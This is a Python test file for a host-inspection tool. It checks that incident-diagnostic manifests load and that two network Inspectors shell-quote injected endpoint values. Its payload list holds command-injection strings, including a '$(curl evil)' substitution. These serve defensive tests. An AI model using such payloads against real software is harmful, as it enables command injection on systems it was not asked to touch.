"""Static + behavioural contract tests for the incident-pack Inspectors.

Covers `incident-pack/spec.md`:

  * §需求:八场景诊断覆盖 §场景:8 场景对应的 Inspector 全部可加载 — every one
    of the 11 manifests loads cleanly and the registry surfaces them with
    zero errors.
  * §需求:八场景诊断覆盖 §场景:Inspector 不含 hook.py 或 sql_result — no
    manifest declares a `hook.py` sibling and no `parse.format` is
    `sql_result`.
  * Shell-injection escape: the two parameterised Inspectors
    (`net.dependency.tcp_check` / `net.tls.cert_expiry`) render an
    injection payload as fully `shlex.quote`-d literal text.

These are pure manifest/render assertions — no real subprocess or network
IO. The end-to-end double-replay snapshot tests live under
`tests/incidents/` (group 4).
"""

from __future__ import annotations

import shlex
from pathlib import Path

import jinja2
import pytest

import hostlens.inspectors as _inspectors_pkg
from hostlens.core.config import Settings
from hostlens.inspectors.loader import load_manifest
from hostlens.inspectors.registry import build_registry_from_search_paths
from hostlens.inspectors.runner import _sh_filter

# The 11 incident-pack Inspector names (point-namespaced) mapped to their
# manifest file path relative to the builtin root (underscore filenames).
INCIDENT_PACK: dict[str, str] = {
    "linux.cpu.top_processes": "linux/cpu_top_processes.yaml",
    "linux.system.load_avg": "linux/system_load_avg.yaml",
    "linux.memory.pressure": "linux/memory_pressure.yaml",
    "linux.kernel.oom_killer": "linux/kernel_oom_killer.yaml",
    "linux.disk.usage": "linux/disk_usage.yaml",
    "linux.fs.inode_pressure": "linux/fs_inode_pressure.yaml",
    "linux.systemd.failed_units": "linux/systemd_failed_units.yaml",
    "log.tail.error_burst": "log/tail_error_burst.yaml",
    "linux.process.fd_usage": "linux/process_fd_usage.yaml",
    "net.dependency.tcp_check": "net/dependency_tcp_check.yaml",
    "net.tls.cert_expiry": "net/tls_cert_expiry.yaml",
}

# Injection payloads exercised against the parameterised Inspectors.
INJECTION_PAYLOADS: list[str] = ["'; whoami; #", "$(curl evil)"]


def _builtin_root() -> Path:
    pkg_file = _inspectors_pkg.__file__
    assert pkg_file is not None
    return Path(pkg_file).parent / "builtin"


def _render(command: str, **values: object) -> str:
    env = jinja2.Environment(autoescape=False, undefined=jinja2.StrictUndefined)
    env.filters["sh"] = _sh_filter
    return env.from_string(command).render(**values)


# --------------------------------------------------------------------------- #
# §场景: 8 场景对应的 Inspector 全部可加载
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize("name", sorted(INCIDENT_PACK))
def test_each_manifest_loads_cleanly(name: str) -> None:
    manifest = load_manifest(_builtin_root() / INCIDENT_PACK[name])
    assert manifest.name == name
    assert manifest.targets == ["local", "ssh"]


def test_registry_surfaces_all_eleven_with_zero_errors() -> None:
    result = build_registry_from_search_paths([], settings=Settings())
    assert result.errors == []
    names = set(result.registry.names())
    missing = set(INCIDENT_PACK) - names
    assert missing == set(), f"registry missing incident-pack Inspectors: {sorted(missing)}"


# --------------------------------------------------------------------------- #
# §场景: Inspector 不含 hook.py 或 sql_result
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize("name", sorted(INCIDENT_PACK))
def test_no_hook_py_and_no_sql_result(name: str) -> None:
    manifest_path = _builtin_root() / INCIDENT_PACK[name]
    manifest = load_manifest(manifest_path)

    # No sibling hook.py — the pack is pure YAML + Finding DSL.
    assert not (manifest_path.parent / "hook.py").exists()

    # parse.format is one of the four supported formats, never sql_result.
    assert manifest.parse.format in {"raw", "table", "json", "kv"}
    assert manifest.parse.format != "sql_result"


# --------------------------------------------------------------------------- #
# Shell-injection escape for the two parameterised Inspectors
# --------------------------------------------------------------------------- #


def test_tcp_check_escapes_injection_payloads() -> None:
    manifest = load_manifest(_builtin_root() / INCIDENT_PACK["net.dependency.tcp_check"])
    rendered = _render(
        manifest.collect.command,
        endpoints=INJECTION_PAYLOADS,
        timeout_seconds=3,
    )
    # Each payload appears only in its shlex.quote-d form — never as raw
    # shell-evaluable text.
    for payload in INJECTION_PAYLOADS:
        quoted = shlex.quote(payload)
        assert quoted in rendered
    # The raw command-substitution form must not appear unquoted.
    assert "$(curl evil)" not in rendered.replace(shlex.quote("$(curl evil)"), "")


def test_tls_cert_expiry_escapes_injection_payloads() -> None:
    manifest = load_manifest(_builtin_root() / INCIDENT_PACK["net.tls.cert_expiry"])
    rendered = _render(
        manifest.collect.command,
        endpoints=INJECTION_PAYLOADS,
        warn_days=30,
        critical_days=7,
    )
    for payload in INJECTION_PAYLOADS:
        quoted = shlex.quote(payload)
        assert quoted in rendered
    assert "$(curl evil)" not in rendered.replace(shlex.quote("$(curl evil)"), "")
